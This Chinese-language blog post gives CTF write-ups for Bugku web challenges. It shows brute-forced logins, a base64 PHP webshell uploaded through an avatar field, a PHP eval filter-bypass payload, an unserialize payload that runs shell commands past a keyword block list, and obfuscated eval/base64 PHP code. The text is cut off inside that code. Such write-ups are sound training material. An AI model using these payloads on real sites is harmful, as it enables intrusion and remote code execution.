---
title: 新版bugku平台Writeup
tags: CTF
top_img: >-
  https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%60%5DEGP1RJ%5D%7DAC%5D_%5D85OHB%257U.png
cover: >-
  https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/9YT534K~N47CEGE%5BCM9A%25C6.png
abbrlink: 49040
date: 2020-12-30 10:08:28
---

# 前言

前段日子，新版bugku平台改版上线，然后我就兴冲冲的去刷了一波:joy:
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%60%5DEGP1RJ%5D%7DAC%5D_%5D85OHB%257U.png)
大部分题还是上线的老bugku平台的题，但也在逐渐上线新题，所以开了个文章记录下新题的做题过程（会慢慢更新）。有大部分web的题我在博客的另一篇文章写过，这里不重复写了，只记录一些想记录的题。
想看的师傅移步到这里https://www.wlhhlc.top/posts/55334/噢。

# Web

## xxx二手交易市场

题目提示是：本人现实碰到的题目，无提示勿问。好家伙，莫非要渗透一波？？
打开是一个购物市场页面
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/G28I_WP%25XFU%2905H%60NC600YM.png)
浏览完一遍，发现有注册和登录功能。
在登录尝试用admin登录，提示限制得6位以上。准备采取爆破，因为验证码是只是前段验证，爆破是可行的(不过就算不是前段验证，训练一波验证码识别也可以哈哈哈\~)
但用户名和密码同时爆破工作量有点大，所以我们去注册页面去尝试爆破注册，看看能否爆破出已经存在的用户名
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/U6CVM4G8VJOZ%5D2CR9KW0LNW.png)
burpsuite启动！
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/5LVOQBO085X%25U9~Q6KR8%28QP.png)
爆破出存在用户名123456，接着去登录页面进行爆破，拿到密码为123456
芜湖，登录！:v:
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/QZX%29EN3X%40%7DDW~6FSXD_OU_5.png)
发现头像是图片文件上传点，然后熟悉的一梭子打下去（图片马，抓包）
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/T0RM~~4R%24AQSD2R6_814M0D.png)
发现我们传送的数据是base64的数据流，我们去写一句话木马，然后base64编码
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/XN97XRJKMI%28EO%25H%256YFLQ%7DC.png)
把拦截的图片数据改成经过base64编码后的一句话木马，并且把前面的jpeg改成php，gogogo！
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/7%7BJU8%7B2U%40VT5DZ44%5BUMU%25UE.png)
上传成功，蚁剑启动！
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/QQ%E6%88%AA%E5%9B%BE20201230103931.png)
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/xx%E4%BA%8C%E6%89%8B%E4%BA%A4%E6%98%93%E5%B8%82%E5%9C%BA/79IMCM%5DG~E%60B5%29%5BERZWUL2B.png)
flag成功拿到，收工。

## 冬至红包

至今仍不知道那天的红包有多大
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/1%5D%60_N%29%5DP4Q%28M%29%40D4I7B%5B153.png)
打开题目，一段php代码，考绕过的功底了
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/1NYXWXRZ8%7DG%5B57CFJ%28YMLN8.png)
首先审计一下代码

```php
<?php
    error_reporting(0);
    require __DIR__.'/flag.php';

    $exam = 'return\''.sha1(time()).'\';';

    if (!isset($_GET['flag'])) {
        echo '<a href="./?flag='.$exam.'">Click here</a>';
    }
    else if (strlen($_GET['flag']) != strlen($exam)) {
        echo '长度不允许';
    }
    else if (preg_match('/`|"|\.|\\\\|\(|\)|\[|\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) {
        echo '关键字不允许';
    }
    else if (eval($_GET['flag']) === sha1($flag)) {
        echo $flag;
    }
    else {
        echo '马老师发生甚么事了';
    }

    echo '<hr>';

    highlight_file(__FILE__);
```

> 第一个if：判断是否传参变量flag，没有就输出$exam和一些html
> 第二个if：判断flag变量的长度是否和$exam的长度相等
> 第三个if：过滤一些关键字符
> 第四个if：eval执行flag变量里面的内容，并且要等于flag变量的SHA-1散列

这里我实在是不知道是如何能执行后等于sha1值，我觉得题目考点也不在这。所以我们采取绕过的形式，可以看到相等后会输出flag.php里面变量$flag的值，而现在又可以执行我们传入的flag变量内容，所以我们直接构成语句达到输出$flag的目的
为了绕过flag过滤，我们可以使用php中$$引用变量的特性和php短写标签的特性

```php
//$$变量使用
<?php
    $a = 'abc';
    $$a = '100';
	echo $a."<br/>";
	echo $$a."<br/>";
	echo $abc;
>

/*输出值分别如下：
abc
100
100
*/
    
//php短标签特性
    
/*
1.<?php echo "abc"?>
2.<?="abc";?>

上面两个语句都是输出abc
*/

```

我们先点击clickhere获取$exam的值:
flag=return'5e22e75193f17cf3e608058536d49e4a7fd7dc56';
所以$exam=return'5e22e75193f17cf3e608058536d49e4a7fd7dc56';
构造url如下：

```
?flag=$w=blag;$w{0}=f;?>888888888888888888888;<?=$$w;?>
```

![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%86%AC%E8%87%B3%E7%BA%A2%E5%8C%85/MB%29%40%283X4J_ZZ%7B6SDWZ%401DTU.png)
成功拿到flag，就是没红包了呜呜呜。

## 安慰奖

打开页面，返回一个空白页面，御剑启动!:zap:
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/%295N%7B4KOUA3%7DZI%28R%40JN~7V84.png)
扫描到存在index.php.bak文件，应该是备份文件，下载下来，打开得到源码

```php
<?php

header("Content-Type: text/html;charset=utf-8");
error_reporting(0);
echo "<!-- YmFja3Vwcw== -->";
class ctf
{
    protected $username = 'hack';
    protected $cmd = 'NULL';
    public function __construct($username,$cmd)
    {
        $this->username = $username;
        $this->cmd = $cmd;
    }
    function __wakeup()
    {
        $this->username = 'guest';
    }

    function __destruct()
    {
        if(preg_match("/cat|more|tail|less|head|curl|nc|strings|sort|echo/i", $this->cmd))
        {
            exit('</br>flag能让你这么容易拿到吗？<br>');
        }
        if ($this->username === 'admin')
        {
           // echo "<br>right!<br>";
            $a = `$this->cmd`;
            var_dump($a);
        }else
        {
            echo "</br>给你个安慰奖吧，hhh！</br>";
            die();
        }
    }
}
    $select = $_GET['code'];
    $res=unserialize(@$select);
?>

```

题型是反序列化，首先需要get传参code
我们先了解一下常见的php魔术方法：

> \__construct() 创建对象时调用
> \__destruct() 销毁对象时调用
> \__toString() 当一个对象被当作一个字符串使用
> \__sleep() 在对象在被序列化之前运行
> \__wakeup 将在序列化之后立即被调用

访问控制修饰符：

> public(公有)
> protected(受保护)
> private(私有的)
> protected属性被序列化的时候属性值会变成：%00*%00属性名
> private属性被序列化的时候属性值会变成：%00类名%00属性名

分析源码
首先初始化ctf类的时候会创建两个变量，username和cmd，满足username=admin的时候就会输出cmd的类型与值
所以我们构建如下代码

```php
<?php
class ctf
{
    protected $username = 'hack';
    protected $cmd = 'NULL';
    public function __construct($username,$cmd)
    {
        $this->username = $username;
        $this->cmd = $cmd;
    }

    function __destruct()
    {
        if(preg_match("/cat|more|tail|less|head|curl|nc|strings|sort|echo/i", $this->cmd))
        {
            exit('</br>flag能让你这么容易拿到吗？<br>');
        }
        if ($this->username === 'admin')
        {
            // echo "<br>right!<br>";
            $a = `$this->cmd`;
            var_dump($a);
        }else
        {
            echo "</br>给你个安慰奖吧，hhh！</br>";
            die();
        }
    }
}
$obj = new ctf('admin','ls');
echo serialize($obj);
?>
```

运行后得到：
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/1%40O68EH%60IO%7D%252WRXFXJ4%29%29L.png)
即O:3:"ctf":2:{s:11:" * username";s:5:"admin";s:6:" * cmd";s:2:"ls";}
**注意**：
我们需要绕过_wakeup()，就得把2写成3，当代表变量个数的数字大于实际真实值时就会绕过这个函数，否则username变量会被覆盖成guest，而不是admin。
还有一点，就是前文提到的，protected属性被序列化的时候属性值会变成：%00*%00属性名
所以payload如下：

```
?code=O:3:"ctf":3:{s:11:"%00*%00username";s:5:"admin";s:6:"%00*%00cmd";s:2:"ls";}
```

![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/RMGXZVYRXISXL9%60J981BXV4.png)
可以看见有flag.php文件，我们再cat读取一下，因为这里过滤了cat，所以我们改成ca\t flag.php
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/9DY%28%7B74VIOO~Z2%24DMDYJU4T.png)
在源码里找到flag
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/O6%24T%60B%7BV6%24%5D2FR2%60%7D4%5D%7B_U9.png)
当然也可以使用tac命令
![](https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%96%B0bugku/%E5%AE%89%E6%85%B0%E5%A5%96/O%25ARZ%5D4%40653A5%28L5A9%5BJGR7.png)

## getshell

打开，看到一堆被混淆过后的php源码:triumph:

```php
 <?php
define('pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn', __FILE__);
$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ = urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{3} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{6} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{33} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{30};
$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{33} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{10} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{24} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{10} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{24};
$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV = $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ{0} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{18} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{3} . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ{0} . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ{1} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{24};
$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{7} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{13};
$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC.= $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{22} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{36} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{29} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{26} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{30} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{32} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{35} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{26} . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ{30};
eval($BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC("JE52aXV5d0NlUFdFR2xhY0FtZmpyZ0JNVFlYekhacEl4RHFRbnNVS2tob3RGU09SZFZKTGI9IldBckllVEJFWFBaTlN0b3ppZ2hmcENPUlV2S0x5eFFubXdsR2NqYVZiRGtGdUpZZHNNSHF1d1dBZW1NVWhRb0NMYURma0Z4VEtsenRCWHJkT2liSEpqeU52WVNQcGNzSVpFR1JnblZxUWM5alNWd0ZvTlBKU3U1eXJsUjZTMkNzcHV5TlBJb3JMSUk1dnU5RFJVYU9wSHhmbVZSSmIwdGpQQnlvU3lFSXVzRUNQMmlidVU5MlJCNUhCMkV4b0JJVkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzR2h5enZ1NXlwM0VVTFZ4TmJ5QzNHMGFEbU5LckJWdFFTQkNKdUJJSHVIb2twSXhQQnl0aFBKMWp0QjF0dDJhNkx1dGZSbTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdmVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuMzBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZNOXpPdG90MUtBUkp5amIzUDZtMW9pdnlSQkJCb2dvSHlsTGh0YnYyeGtHM3h5THMxZEdCUEdwMjEzQkpSWlB1YW1vVUlubXN0cVFMdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbmZUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdpblYwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25ZdDlka3RsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZlVqVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnT0NWMDdFSXRzdlUxclMyeEd0aElTbUpDYkdoeGtlQmFodDNLdVJOUEhCdTVPdUJpUXRKeTFTc3RjcEJ4THBWUk1iSjlQTGhvbXYyRzlFSXlWdXN4MlNoTWNSaEtRUEhJT1AxdHR0SmlKZUJFRVJJTWZTTkVZZU5Qcm1CYXh0UHhYcGhSTG8yNVBTMUNzYkJpenROSzduVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bm14OWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQzlka3RvdDFLQVJKeWpiM1A2bTFvaXZ5UkJCQm9nb0h5bExodGJ2MnhrRzN4eUxzMWRHQlBHcDIxM0JKUlpQdWFtb1VJbm1zdHFlZk05ZGt0b3QxS0FSSnlqYjNQNm0xb2l2eVJCQkJvZ29IeWxMaHRidjJ4a0czeHlMczFkR0JQR3AyMTNCSlJaUHVhbW9VSW5tc3RxZWZJOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmQTBUbWdzdjNLeUcyMW9SdUlPcFZ4TlBCeWhldTlrUk5vWm1VNXJCUHRjdFZvYlMxb210MHhIdFBLS3VOeFFtQmEzdlVFc2J1S2lCWTBzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmczVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnaW4zMDdFTkk1bUhJWm91OU90VXg0dHNFbVIyQ2RTVWlxTHlNMG0yeWNveXlNbzFLMkdKaUdQUEVCUDFvYXZVUENCQlJXZXN5c3YzQlpRTHRsUHM1a2IyQ3FwM0l4cEhQT0J1UERMdVJJbTIxbnQxS0NQaEs1UFZ4YnYzdFdSMEkyb0hNbUwxRUdwVUtLb0lSVXR5eUFlZkFPVEw0c2J5b3pHc0NZU0o5aUd1NTF2eUl5U1V5SHRCOWFtVVJTbVBQNmVQdDRCVkMwUzNSTVJKb2pCMGFMdU5pclN1dGh0VW9vTFZnZkNIMFpFVUV1bUpFY0cyS1h2dUlaUmhFdG91eEVvMFBRcEJpVnVzMVBlSHlCZUlNZlJOYTNiaG9KdklDZEJ5eGdMSnlzUDB0TnVCeDduWXk5ZGt0bFBzNWtiMkNxcDNJeHBIUE9CdVBETHVSSW0yMW50MUtDUGhLNVBWeGJ2M3RXUjBJMm9ITW1MMUVHcFVLS29JUlV0eXlBZWZBMlRMNHNieW96R3NDWVNKOWlHdTUxdnlJeVNVeUh0QjlhbVVSU21QUDZlUHQ0QlZDMFMzUk1SSm9qQjBhTHVOaXJTdXRodFVvb0xWZ2ZuVjBaRVVFdW1KRWNHMktYdnVJWlJoRXRvdXhFbzBQUXBCaVZ1czFQZUh5QmVJTWZSTmEzYmhvSnZJQ2RCeXhnTEp5c1AwdE51Qng3bmZFOWRrdGxQczVrYjJDcXAzSXhwSFBPQnVQREx1UkltMjFudDFLQ1BoSzVQVnhidjN0V1IwSTJvSE1tTDFFR3BVS0tvSVJVdHl5QWVmbjFUTDRzYnlvekdzQ1lTSjlpR3U1MXZ5SXlTVXlIdEI5YW1VUlNtUFA2ZVB0NEJWQzBTM1JNUkpvakIwYUx1TmlyU3V0aHRVb29MVmdPQ0gwWkVVRXVtSkVjRzJLWHZ1SVpSaEV0b3V4RW8wUFFwQmlWdXMxUGVIeUJlSU1mUk5hM2Job0p2SUNkQnl4Z0xKeXNQMHROdUJ4N25mTTl6MlAyR3VqREVOSTVtSElab3U5T3RVeDR0c0VtUjJDZFNVaXFMeU0wbTJ5Y295eU1vMUsyR0ppR1BQRUJQMW9hdlVQQ0JCUldlc3lzdjNCREFzS0l1czl4TElLeEJZTWpweW9ndHlva3VWTTVHMFI0dlBLR3RIRUJudWl6UG1NZ1NQb0FCSG9ZblZ0Q0J1NURCMUdPdHN5eFBCNXFCeVBMblBLTlNVRXNuQkExdUowMHpCeWd2VlB5cHlLNUJzUnVleUNocFU1a1BCb2RQQlB6bklvWmJ5eXNuQjVMQllFTnYxb1BlTjl1bll5V29QUnp0MUV1Qll0U251aml1dWlyYjFDSVJJTXhuY1BpdUo1TmV5eXVMc2F5UEppNFBjTTBTeW9HTEh0dW5VR09Hc1JycHlLV25QSUxTMngyb2NDTHAySWd1SmF4UHlFckcwb0RiMUVoQ1BFaHBITUJQVXh1TE5Vam1zUFNQbUIwQlBvV0NQdGh6bUlrUGZQbFB1S3R6QnlxUk5pc3BCb2ZMMENZZDFNS0czUHJ0MEcxUE41TlJQS2h6aHlMdHVGMEJKYXJQTmJPbXNpeHRoeGlCMmlsbkliT3BVdFNwTmlsdVlJam55eWFlSXl1UHNLUFBZSVNSTkNJUHM1UFB1dE9vdWFnUzJuZlB1OXJ0SmlBUDJhRG5KSUdic3RzdVZNYlBKNU5lUEdpQnlFTHBoeGFvUFByTEp0TmJIS3h0MEtxb0JSdUwxdFBSTnhMUEp4Mkd5eHNCMURPQ1BveG5CNVdCUFA0bTFFVnAyOXJ0eUVXRzBCaUwyVU9TSXlMdVVveFBOMXpCUHlHU055eVBodEdCWUNqUDJ0VlBKNVBQZlA1UDFQNEJJRWFwY0l4UzFFVUd5UERCMkVBb1VFdHBteXVCMXhTUE5uT3V1OXJ0UEtRR0J4U0dQQWp2TjV1cFVvdUd5eGpldUNWZVZJU3VVb09QY0lnbXlCanBOeXVMSUUyR2ZNMG1QSVpTSUN1bnNvRUdQUHpTeUVQQllJU3RKeGxvY0lsQ1BLYUNWQ3JMVTQydXlSelJJUkdQSnhZcGhGMEJKaXVMeUdmcFZvb3B5RWFHSmE0bTFDZ3R5UHRuSUFPUEJSMFAxQmpvVXlTbklveEdQb0RwMWJqbkJpc24wRWN1c1BOdnVDdUxoSUNTdWFmTHNvTFMyQ0luQmF4bkp4b0J5eE5HUHRhbXlJb3VOeEtvUFAwdUlBZnZJUnN0MW9aUFB2MWVQUlBlSU1McHVqaUd1YUx0TkVQU0lDa0xOdGxCdTA1UHlDR3V5dFlueXlYTHNQU20ySUF1SklMblZNWlBKaU5QSkVHdlZ5WXQzeGl1eXhOdnliaXBVNVBuTmlLUHN4TFJKbmpSVTF0cEp4bVBZRU5MdUlQbUpLTFBQQWl1c29EYkpiaWJZUFNwbXRmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lmTHN4ekN5S2htSHRodUlvREcyMTRDSUVnUHNLdW4yaTJ1dTVMcHVFV2VVOW1wVW9QQm1NTG55UFZSSVJQbk50RXVZTXVHdUl1U045Qm5jSW5vY0NsYjFLSXRISVlQc3lqbVVDTFBQS0FiczVtcGh0WFAwUHVlSVJXQ3VLUHQwRzB1dTVnbUlHam9jb3VweUVndVlJTlJ1Q2dwVTFCbklLam9JUmp0UFVPbkJ5UHBoRmZCUFByUnlvUHBjRVBuMDVhTDBDTHQxdGFTY0VoUzJ0ZHVZSVNCeW9obm1vWXBzRWZHdTF1ZU5VanpQS0JQczVydXVpTG5OQWZtc2lCdEJEMFB1aXNTSUNWcFV0b25Jb0lvSVJMdVBJR29JSXlQMUsxbVV0TXYwS0FtWW9TUDA1MFAxeHVTTkNhZWN0THBJb3JQWUNnUnl5WkJKMWtTM3hRQjJpTlBQVWpCWUVQdDN0aFBtTXNMUERqUEpJeFBKeFhQY3dpbU5iZmJzQ1N0Qm9pRzFvRXZVYW1TM01RUmYwOUFrc0t6ZjgrUWM5alNWd0ZvTlBKU3U1eXJsUlpTeW81djBFU1JIeE9tTmFOdXV0enAyb1lvMFIxR2hSVUxKRWd2VTltQkJQQUJ5UGFMMnlNU1ZLRWIyUDBCVTFpdUlSQkVPaWpvSmE2dVBQeXBWeEl0MjF1RzJ0VW1zaUJTeXhjQjB5SG1CRWRtM1BBYkJvNUJIdHhHSjlpUjBLS0JQUjJ2MUtPQk54WnJtZ3NtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZjMTF2Smlzb3VDWG9OQkRBa0IydG1VeUMwVXlDWUF5bnNHeUNzYnlDWVUxRW1QY0VtdjJFbXYwbmxCMnptQTRFbUVVRW12akVtdjRFbXYxRW12aUVtdjVFbUVNQ2tCMmJPQjNua0IyYmtCMkNsQjJDZnN5Q0JHeUNZQnlDWUZ5Q1lueUNmbnlDZnZ5Q3NHMEVtRWxFbUcybmZ2eUNzVWtybWdzTE5FR29WdFZQdWF5dEJ0Z0JKUmpSM0N4dkpvWlB5eVhQSUNkTHVDYlJKeGNQMktsU2hLdG1JSzR0czExZXUxTW1ISXJtZjBzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdmVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnMlRMNHNtMmladE5hNm1KUGlSSktkcFB5RG1CRUVCM3hyYjNQU295SUxSMGloTFVSTnYzdFBHMElYdUlvNXZKRUt0UHRiR3V0SHZWZ2ZuMzBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNExzQzF1Sm90QkhSblAweFZ0SEMwUHVDTXAxeHVlaEVrU0JQQkJOSXNvM003bmZNOXpPdEVwMkN5YjI1aVBzYVF0SmFPcElFcVBQTUlvVTVEYmhQbW1CS2xlSjFWUnl0bmVodEt2MlJqdXl5a0JQeEFvc3QzUDN4eFFMdFFwTjVVUzNLem9oSTJTc2FhdXV4Q2JzeW1lVUtjUlBLSkJQRTNtSVJBdDBvZlJJUFlidTlHUEh5T0dKeUlQSU14b05SamVmbmZUTDRzbTJpWnROYTZtSlBpUkpLZHBQeURtQkVFQjN4cmIzUFNveUlMUjBpaExVUk52M3RQRzBJWHVJbzV2SkVLdFB0Ykd1dEh2VmdpblYwWkVVOWdwc3RXZXM1eXZob3FMMjFvU1UxbExQQzRMc0MxdUpvdEJIUm5QMHhWdEhDMFB1Q01wMXh1ZWhFa1NCUEJCTklzbzNNN25ZdDlka3RRcE41VVMzS3pvaEkyU3NhYXV1eENic3ltZVVLY1JQS0pCUEUzbUlSQXQwb2ZSSVBZYnU5R1BIeU9HSnlJUElNeG9OUmplZlVqVEw0c20yaVp0TmE2bUpQaVJKS2RwUHlEbUJFRUIzeHJiM1BTb3lJTFIwaWhMVVJOdjN0UEcwSVh1SW81dkpFS3RQdGJHdXRIdlZnT0NWMDdFVXRZR0h5Ym1ITW9CMGExdEJDMm91YUVQeUtnbTFJTlBVMTNvMXhLcHNJSkd1OUFvVktpU1VSaEJIRW52MjFyYkpLUFJWRjlFVXlYRzJQY3BISXVMMDlOUzNFZ0JKS1BCVVBzbUp4TVJQQ0NMc0U2cEJSMlBVaTVSTnlmbzNNU3V1RXR1VXhKdFZSaGVOSTduVjBaRVU5Z3BzdFdlczV5dmhvcUwyMW9TVTFsTFBDNEx